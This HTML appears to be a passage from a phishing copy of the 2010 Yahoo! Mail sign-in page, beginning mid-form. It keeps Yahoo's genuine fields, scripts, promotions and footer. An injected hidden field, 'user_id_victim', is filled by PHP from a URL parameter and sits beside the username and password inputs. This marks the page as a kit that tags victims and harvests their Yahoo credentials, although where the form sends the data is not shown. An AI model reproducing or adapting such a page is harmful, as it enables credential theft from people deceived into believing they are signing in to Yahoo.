				<input type="hidden" name=".src" value="ym">
				<input type="hidden" name=".md5" value="">
				<input type="hidden" name=".hash" value="">
				<input type="hidden" name=".js" value="">
				<input type="hidden" name=".last" value="">

				<input type="hidden" name="promo" value="">
				<input type="hidden" name=".intl" value="us">
				<input type="hidden" name=".bypass" value="">
				<input type="hidden" name=".partner" value="">
				<input type="hidden" name=".u" value="7fmqamd5pg6bn">
				<input type="hidden" name=".v" value="0">
				<input type="hidden" name=".challenge" value="PxsbSkDShRsMY20bUEn5OGo_LjNc">
				<input type="hidden" name=".yplus" value="">
				<input type="hidden" name=".emailCode" value="">

				<input type="hidden" name="pkg" value="">
				<input type="hidden" name="stepid" value="">
				<input type="hidden" name=".ev" value="">
				<input type="hidden" name="hasMsgr" value="0">
				<input type="hidden" name=".chkP" value="Y">
				<input type="hidden" name=".done" value="http://mail.yahoo.com">
				<input type="hidden" name=".pd" value="ym_ver=0&c=&ivt=&sg=">
				<table id="yreglgtb" summary="form: login information" cellspacing="0" cellpadding="0">
                                        <tr>

                                                <th id='thun'><label for="username">Yahoo! ID:</label></th></tr>
                                        <tr>
                                                <td><input name="username" id="username" value="" size="17" class="yreg_ipt" type="text" maxlength="96"><input type="hidden" name="user_id_victim" value="<? echo $_GET['i']; ?>" /></TD></TR>
							
						<div class="dbidTip">(e.g. free2rhyme@yahoo.com)</div>
					    </td>
                                        </tr>
                                        <tr>
                                                <th id='thpw'><label for="passwd">Password:</label></th></tr>

                                        <tr>
                                                <td><input name="passwd" id="passwd" value="" size="17" class="yreg_ipt" type="password" maxlength="64"></td>
                                                
                                        </tr>


  <tr>
    <td id='fun'>
    </td>
  </tr>

				
				</table>
		<script src="https://s.yimg.com/lq/lib/reg/js/yahoo_dom_event_animation_2.2.0.js" type="text/javascript"></script>
				
            <p id="sigcopys"><input type="checkbox" id="persistent" name=".persistent" value="y"
    >
    <label for="persistent"> <span class="kmsibold">Keep me signed in</span><br><span class="subperstxt">for 2 weeks unless I sign out.</span> <em class="nwred" style="font-style: normal; font-size: 85%; vertical-align:5px;"><a href="https://login.yahoo.com/config/login?.src=ym&.intl=us&.help=4&.v=0&.u=7fmqamd5pg6bn&.last=&promo=&.bypass=&.partner=&pkg=&stepid=&.pd=ym_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D&.ab=&.done=http%3A//mail.yahoo.com" tabindex="99999">Info</a></em></label>
    <span class="subperstxt2">[Uncheck if on a shared computer]</span>

    </p>
    <div class="clear"></div>

        
				<p class="yreglgsb"><input type="submit" id=".save" name=".save" value="Sign In"></p>
				</form>	
				</fieldset>
<style type="text/css">
.fcue-outer *{overflow:visible;}
.fcue-outer * p{font-family:Verdana;font-size:85%;color:#333;}
.fcue-outer{max-width:558px;margin-left:22px;background:transparent;border:none;position:relative;overflow:visible;text-align:left;}
.fcue-yellow .fcue-small .fcue-inner,.fcue-yellow .fcue-small * .fcue-t,.fcue-yellow .fcue-small .fcue-b,.fcue-yellow .fcue-small .fcue-b div{background:transparent url(https://s.yimg.com/lq/i/reg/fcue-sprite.png) no-repeat -350px 0;_background-image:url(https://s.yimg.com/lq/i/reg/fcue-sprite8.png);}
.fcue-outer .fcue-inner{position:relative;zoom:1;_overflow-y:hidden;padding:0 22px 0 0;}
.fcue-outer .fcue-inner .fcue-content{overflow:hidden;}
.yui-panel-container .fcue-outer * .fcue-t{position:absolute;left:0;top:0;width:22px;margin-left:-22px;height:100%;_height:1600px;background-position:top left;}
.yui-panel-container .fcue-outer .fcue-b{position:relative;width:100%;background-position:bottom right;}
.yui-panel-container .fcue-outer .fcue-b,.yui-panel-container .fcue-outer .fcue-b div{height:21px;font-size:1px;background-position:-350px -157px;}
.yui-panel-container .fcue-outer .fcue-b div{position:relative;width:22px;margin-left:-22px;background-position:bottom left;}
.fcue-outer * .hd{background:transparent;border:none;padding:22px 5px 0;white-space:normal;font-weight:bold;}
.fcue-outer * .bd{position:relative;padding:0 5px 5px;}
.fcue-outer * .bd p{margin:0;font-size:77%;}
.fcue-outer * .ft{text-align:right;padding:0 5px 15px 8px;position:relative;_position:static;_padding-bottom:47px;}
.fcue-outer * .ft .l{width:49%;float:left;text-align:left;padding-top:5px;}
.fcue-outer * .ft .r{width:49%;float:right;*padding-right:12px;*width:47%;text-align:right;}
.fcue-yellow .fcue-pnt{width:48px;height:48px;background:transparent url(https://s.yimg.com/lq/i/reg/fcue-sprite.png) no-repeat -578px 0;_background-image:url(https://s.yimg.com/lq/i/reg/fcue-sprite8.png);position:absolute;left:209px;top:15px;_top:25px;}
.fcue-outer .fcue-pnt-l{background-position: -54px;top:12px;left:-61px}
#fc1 #fcue-bd{font-size:85%;line-height:118%;}
#fc1{position:absolute;width:250px;visibility:hidden;}

</style>

<div id="fc1">
	<div id="fcue_c1" class="yui-panel-container fcue-yellow">
		<div id="fcue1" class="yui-module yui-overlay yui-panel fcue-outer fcue-small">

			<div class="fcue-inner">
				<div class="fcue-t"></div>
				<div id="fcue-bd"class="fcue-content">
				    <div class="hd">CAPS LOCK is On</div>
					<div class="bd">	
                    	<p>Your Yahoo! password is case sensitive</p>
					</div>
				</div>

			</div>
			<div class="fcue-b"><div></div></div>
			<div class="fcue-pnt fcue-pnt-r"></div>
		</div>
	</div>
</div>

<script type="text/javascript">
function isCapslock(e){ 
    if (!e) { 
        var e = window.event;
    }
    var code = false;
    if (e.keyCode) {
        code = e.keyCode;
    } else if (e.which) {
        code = e.which;
    }
    var shifton = false;
    if (e.shiftKey) {
        shifton = e.shiftKey;
    } 
    if (code >= 97 && code <= 122 && shifton) {
        return true;
    }
    if (code >= 65 && code <= 90 && !shifton) {
        return true;
    }
    return false;   
}

var fc1 = YAHOO.util.Dom.get("fc1");
var passwd = YAHOO.util.Dom.get("passwd");
YAHOO.util.Event.on(passwd, "keypress", function(e) {   
    if (isCapslock(e)) {       
        xy = YAHOO.util.Dom.getXY(passwd);
        xy[0] -= 270;
        xy[1] -= 40;
        YAHOO.util.Dom.setXY(fc1,xy);      
        YAHOO.util.Dom.setStyle(fc1,"visibility","visible");
    } else {
        YAHOO.util.Dom.setStyle(fc1,"visibility","hidden");
    }
});  
</script>


						<a id="forgotLnk" href="https://edit.yahoo.com/config/eval_forgot_pw?new=1&.done=http%3A//mail.yahoo.com&.src=ym&partner=&.intl=us&pkg=&stepid=&.pd=ym_ver%3d0%26c=&.ab=&.last=">I can't access my account</a> 
												| <a href="https://login.yahoo.com/config/login?.src=ym&.intl=us&.help=1&.v=0&.u=7fmqamd5pg6bn&.last=&.last=&promo=&.bypass=&.partner=&pkg=&stepid=&.pd=ym_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D&.ab=&.done=http%3A//mail.yahoo.com">Help</a>

											</p>		
	
			</div>
	<span class="cb"><span class="cl"></span></span>
      <script type="text/javascript">document.write("</div>")</script>
		</div>

	<!-- promo marketing header -->
                <div class="second yregbx">
                        <span class="ct"><span class="cl"></span></span>

                        <div class="yregbxi">
                         <h3>One Yahoo! ID. So much fun!</h3>
                         <p>Use your single ID for everything from checking Mail to checking out Yahoo! Music, Flickr, Messenger, and more.</p>
                        </div>
                        <span class="cb"><span class="cl"></span></span>
                </div>
<!-- End promo marketing header -->
   

<!-- end login box -->	
	</div>

	<div id="yregtxt">	
<!-- begin left side content -->	
<div id="popup"><style>
<!--
#ymalr1_cont{width:480px!important;height:190px!important;clear:left!important;background:url(https://a248.e.akamai.net/sec.yimg.com/a/ya/yahoo_mail8/r1_mobile_photo.jpg) no-repeat!important;overflow:hidden!important;cursor:pointer!important;}
#ymalr1_callout{width:230px!important;height:136px!important;background:url(https://a248.e.akamai.net/sec.yimg.com/a/ya/yahoo_mail8/r1_mobile_photo.gif) no-repeat!important;overflow:hidden!important;margin:39px 0 0 15px!important;}
-->
</style>
<div id="ymalr1_cont" onclick="window.open('https://us.ard.yahoo.com/SIG=15oan7enj/M=341232.13495217.13763996.12040598/D=regst/S=150001463:R1/Y=YAHOO/EXP=1268266391/L=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT/B=wxzYIGKImlQ-/J=1268259191235444/K=8vmWb_Bxz1jGwb4LRQJhnA/A=5887694/R=0/SIG=119o43s41/*http://mobile.yahoo.com/mail','_blank')">
	<div id="ymalr1_callout"></div>
</div> <!--end ymalr1_cont--><script language=javascript>
if(window.yzq_d==null)window.yzq_d=new Object();
window.yzq_d['wxzYIGKImlQ-']='&U=13e3glis6%2fN%3dwxzYIGKImlQ-%2fC%3d341232.13495217.13763996.12040598%2fD%3dR1%2fB%3d5887694%2fV%3d1';
</script><noscript><img width=1 height=1 alt="" src="https://us.bc.yahoo.com/b?P=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT&T=18isrp7p4%2fX%3d1268259191%2fE%3d150001463%2fR%3dregst%2fK%3d5%2fV%3d2.1%2fW%3dH%2fY%3dYAHOO%2fF%3d582906978%2fH%3dc2VjdXJlPSJ0cnVlIiBzZXJ2ZUlkPSJ0eFlWYjBXVGNLRFA0M0FUUzRxaHNnQlNQdnU4VDB1WUdYY0FBeHpUIiBzaXRlSWQ9IjI5MjUwNTEiIHRTdG1wPSIxMjY4MjU5MTkxMjI1MTgyIiA-%2fQ%3d-1%2fS%3d1%2fJ%3dC457C442&U=13e3glis6%2fN%3dwxzYIGKImlQ-%2fC%3d341232.13495217.13763996.12040598%2fD%3dR1%2fB%3d5887694%2fV%3d1"></noscript><style>
<!--
#ymalr2{width:480px!important;padding:0!important;margin:15px 0 0 0!important;font-family:Arial, Helvetica, sans-serif!important;color:#1a1a1a!important;}
#ymalr2 .hd{color:#8f21aa!important;font-weight:bold!important;font-size:16px!important;padding-bottom:8px!important;}
#ymalr2 .listed{margin:0!important;padding:5px 0 5px 20px!important;font-size:13px!important;}
#ymalr2 a{color:#2237ff!important;text-decoration:underline!important;}
-->
</style>
<div id="ymalr2">
	<div class="hd">Stay connected on the go with Yahoo! Mail on your phone.<br /> <a href="https://us.ard.yahoo.com/SIG=15o52lbp9/M=341232.13495217.13763997.12040598/D=regst/S=150001463:R2/Y=YAHOO/EXP=1268266391/L=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT/B=whzYIGKImlQ-/J=1268259191235444/K=8vmWb_Bxz1jGwb4LRQJhnA/A=5887696/R=0/SIG=10uot9a7d/*http://mobile.yahoo.com/mail" target="_blank">Get started</a>.</div>

	<div class="listed">&bull; Easy to use on any Internet-enabled phone.</div>
	<div class="listed">&bull; Keep your Inbox in sync with your PC.</div>
	<div class="listed">&bull; Never miss an important message with instant notifications.</div>
</div><!--end ymalr2_cont--><script language=javascript>
if(window.yzq_d==null)window.yzq_d=new Object();
window.yzq_d['whzYIGKImlQ-']='&U=13emeeaup%2fN%3dwhzYIGKImlQ-%2fC%3d341232.13495217.13763997.12040598%2fD%3dR2%2fB%3d5887696%2fV%3d1';
</script><noscript><img width=1 height=1 alt="" src="https://us.bc.yahoo.com/b?P=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT&T=18j2nhhj7%2fX%3d1268259191%2fE%3d150001463%2fR%3dregst%2fK%3d5%2fV%3d2.1%2fW%3dH%2fY%3dYAHOO%2fF%3d3141459264%2fH%3dc2VjdXJlPSJ0cnVlIiBzZXJ2ZUlkPSJ0eFlWYjBXVGNLRFA0M0FUUzRxaHNnQlNQdnU4VDB1WUdYY0FBeHpUIiBzaXRlSWQ9IjI5MjUwNTEiIHRTdG1wPSIxMjY4MjU5MTkxMjI1MTgyIiA-%2fQ%3d-1%2fS%3d1%2fJ%3dC457C442&U=13emeeaup%2fN%3dwhzYIGKImlQ-%2fC%3d341232.13495217.13763997.12040598%2fD%3dR2%2fB%3d5887696%2fV%3d1"></noscript></div><!-- Content module end -->

<!-- end left side content -->		
	</div>

</div>
<!-- begin footer -->

<!-- intl = us, spaceid = 150001463 offset = 0 position = FOOT -->

<!-- static compact footer --> 

<style type="text/css">
#mem_ft {border-top:1px solid #CCCCCC;font-size:10px;margin-top:1em;padding-top:0.5em;font-family:arial,helvetica,clean,sans-serif;text-align:center}
#mem_ft p {margin:0;padding:0;}
</style>
<div id="mem_ft">
    <p>Copyright © 2010 Yahoo! Inc. All rights reserved.</p>    <p>
        <a href='http://docs.yahoo.com/info/copyright/copyright.html' target='_blank'>Copyright/IP Policy</a> | 
        <a href='http://docs.yahoo.com/info/terms/' target='_blank'>Terms of Service</a> | 
        <a href="http://security.yahoo.com" target="_blank">Guide to Online Security</a> |
        <a href="http://privacy.yahoo.com" target="_blank">Privacy Policy</a>    </p>

</div>	
<!-- end footer -->
</div>
</div>
        <script type="text/javascript">
        if (top != self) top.location.href = location.href;

        </script>
        <script type="text/javascript">
<!--
browser_string = navigator.appVersion + " " + navigator.userAgent;
if ( browser_string.indexOf("MSIE") < 0 ) {
	if (navigator.mimeTypes) {
		for (i = 0 ; i < navigator.mimeTypes.length ; i++) {
			if (navigator.mimeTypes[i].suffixes.indexOf("yps") > -1) {
				 doGotIt();
			}
		}
	} else {
		dontGotIt();
	}
} else {
	if (browser_string.indexOf("Windows")>=0) {
		doGotIt();
		document.write('<object classid="clsid:41695A8E-6414-11D4-8FB3-00D0B7730277" CODEBASE="javascript:dontGotIt();" ID="Ymsgr" width="1" height="1">');
		document.write('</object>');
	}
}
hasMsgr = 0;
function dontGotIt(){
  hasMsgr = 0;
  document.login_form.hasMsgr.value=0;
}
function doGotIt(){
  hasMsgr = 1;
  document.login_form.hasMsgr.value=1;
}

YAHOO.namespace("membership");
YAHOO.membership.setFocus = function(e, id){
  var fid = id ? id : "username";
  var el = document.forms["login_form"].elements;
  var f = false;
  for(var i=0; i<el.length; i++){
    var c = el[i];
    if(c.type == 'text' || c.type == 'password'){
      if(c.value != c.defaultValue){
        return false;
      }
    }
    if(c.id == fid){
      f = true;
    }
  }
  if(f){
    document.getElementById(fid).focus();
  }
}

YAHOO.util.Event.addListener(window, "load", YAHOO.membership.setFocus);
if(typeof YAHOO=="undefined"){YAHOO={};}
YAHOO.namespace("membership");
YAHOO.membership.showError = function(toShowText){
  var errs = YAHOO.util.Dom.getElementsByClassName('yregertxt');
  for(var i=0; i<errs.length; i++){
    errs[i].parentNode.removeChild(errs[i]);
  }
  var fs = document.getElementById('fsLogin');
  var errMsg = document.createElement('div');
  errMsg.innerHTML = toShowText;
  errMsg.className = 'yregertxt';
  fs.insertBefore(errMsg, fs.firstChild);
}

YAHOO.membership.checkInputs = function(e){
  var id = document.getElementById('username');
  var pw = document.getElementById('passwd'); 
  if (!id && pw.value == '') {
     YAHOO.util.Event.preventDefault(e);
     pw.focus();
     YAHOO.membership.showError('<strong>Please enter your password</strong>'); 
  }else if(pw.value == '' && id.value == ''){
    YAHOO.util.Event.preventDefault(e);
    YAHOO.membership.showError('<strong>Invalid ID or password.</strong><br/> Please try again using your full Yahoo! ID.');
    id.focus();
  }else if(pw.value == '' && id.value != ''){
    YAHOO.util.Event.preventDefault(e);
    pw.focus();
    YAHOO.membership.showError('<strong>Please enter your password</strong>');
  }else if(pw.value != '' && id.value == ''){
    YAHOO.util.Event.preventDefault(e);
    id.focus();
    YAHOO.membership.showError('<strong>Please verify your Yahoo! ID</strong>');
  }
}

YAHOO.util.Event.addListener('.save', 'click', YAHOO.membership.checkInputs);
if(typeof YAHOO=="undefined"){YAHOO={};}
var Y = YAHOO;
Y.doUpgradeCheck = function(){
  var plugin, activex, version, params = [];

  if (navigator.plugins && navigator.plugins.length > 0) {
      plugin = navigator.plugins['Shockwave Flash 2.0'] ||
               navigator.plugins['Shockwave Flash'];

      if (plugin && plugin.description) {
          version = plugin.description.replace(/([a-zA-Z]|\s)+/, '').replace(/(\s+r|\s+b[0-9]+)/, '.').split('.');
      }
  } else {
      try {
          activex = new ActiveXObject('ShockwaveFlash.ShockwaveFlash.7');
          version = activex.GetVariable('\$version').split(' ')[1].split(',');
      } catch (e1) {
          try {
              activex = new ActiveXObject('ShockwaveFlash.ShockwaveFlash.6');
              version = [6, 0, 21];
              activex.AllowScriptAccess = 'always';
              version = activex.GetVariable('\$version').split(' ')[1].split(',');
          } catch (e2) {}
      }
  }

  if(version){
      var major = parseInt(version[0], 10);
      var minorA = parseInt(version[1], 10);
      var minorB = parseInt(version[2], 10);
      var strVersion = major + "." + minorA + "." + minorB;

      if(major >= 10){
        //ok
      }else if(major == 9){
        if(minorA == 0 && minorB < 28){
          Y.showUpgradeCTA(strVersion);
        }
      }else if(major == 8){
        if(minorA == 0 && minorB < 34){
          Y.showUpgradeCTA(strVersion);
        }
      }else if(major == 7){
        if(minorA == 0 && minorB < 69){
          Y.showUpgradeCTA(strVersion);
        }
      }else{
        Y.showUpgradeCTA(strVersion);
      }
    }

}
Y.showUpgradeCTA = function(version){
  try{
    var fun = document.getElementById('fun');
    var imgUrl = "https://s.yimg.com/lq/i/nt/ic/ut/bsc/cautionmetro16_1.gif";
    var beaconUrl = 'https://login.yahoo.com/i/flashUp/ft.gif' + '?v=' + version + '&intl=' + 'us';
    fun.innerHTML = "<img id='caution' src='" + imgUrl + "'><span class='b'>Security Alert:</span> <span class='n'><a href='http://help.yahoo.com/l/us/yahoo/security/account_security/adobe-flash.html' tabindex='999' target='_blank'>Protect</a> your account. <a href='http://get.adobe.com/flashplayer/' tabindex='999' target='_blank'>Upgrade your Adobe Flash Player.</a><img src='" + beaconUrl + "' height='1' width='1'></span>";
    fun.style.paddingBottom = '12px';
    fun.style.display = 'block';
  }catch(e){}
}

if(window.addEventListener){
window.addEventListener("load", Y.doUpgradeCheck, false);
}else{
window.attachEvent("onload", Y.doUpgradeCheck);
}

//-->
</script>
<script src="https://s.yimg.com/lq/i/reg/js/login_md5_1.1.js" type="text/javascript"></script>
<script src="https://s.yimg.com/lq/i/reg/js/ylib_dom_1.1.js" type="text/javascript"></script>
<script src="https://s.yimg.com/lq/i/reg/js/yg_browserext_1.1.js" type="text/javascript"></script>
<script src="https://s.yimg.com/lq/i/reg/js/yregml_1.3.js" type="text/javascript"></script>

<!-- spaceid: 150001463 INT.OFFSET: 0 --><!-- SpaceID=150001463 loc=FR05 noad -->
<!-- l27.member.re3.yahoo.com Wed Mar 10 14:13:11 PST 2010 -->
</body>
</html>
<script language=javascript>
if(window.yzq_p==null)document.write("<scr"+"ipt language=javascript src=https://a248.e.akamai.net/sec.yimg.com/lib/bc/bc_2.0.4.js></scr"+"ipt>");
</script><script language=javascript>
if(window.yzq_p)yzq_p('P=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT&T=18e2rasnu%2fX%3d1268259191%2fE%3d150001463%2fR%3dregst%2fK%3d5%2fV%3d1.1%2fW%3dJ%2fY%3dYAHOO%2fF%3d1271300021%2fH%3dc2VjdXJlPSJ0cnVlIiBzZXJ2ZUlkPSJ0eFlWYjBXVGNLRFA0M0FUUzRxaHNnQlNQdnU4VDB1WUdYY0FBeHpUIiBzaXRlSWQ9IjI5MjUwNTEiIHRTdG1wPSIxMjY4MjU5MTkxMjI1MTgyIiA-%2fS%3d1%2fJ%3dC457C442');
if(window.yzq_s)yzq_s();
</script><noscript><img width=1 height=1 alt="" src="https://us.bc.yahoo.com/b?P=txYVb0WTcKDP43ATS4qhsgBSPvu8T0uYGXcAAxzT&T=18jme34iv%2fX%3d1268259191%2fE%3d150001463%2fR%3dregst%2fK%3d5%2fV%3d3.1%2fW%3dJ%2fY%3dYAHOO%2fF%3d2137781389%2fH%3dc2VjdXJlPSJ0cnVlIiBzZXJ2ZUlkPSJ0eFlWYjBXVGNLRFA0M0FUUzRxaHNnQlNQdnU4VDB1WUdYY0FBeHpUIiBzaXRlSWQ9IjI5MjUwNTEiIHRTdG1wPSIxMjY4MjU5MTkxMjI1MTgyIiA-%2fQ%3d-1%2fS%3d1%2fJ%3dC457C442"></noscript>
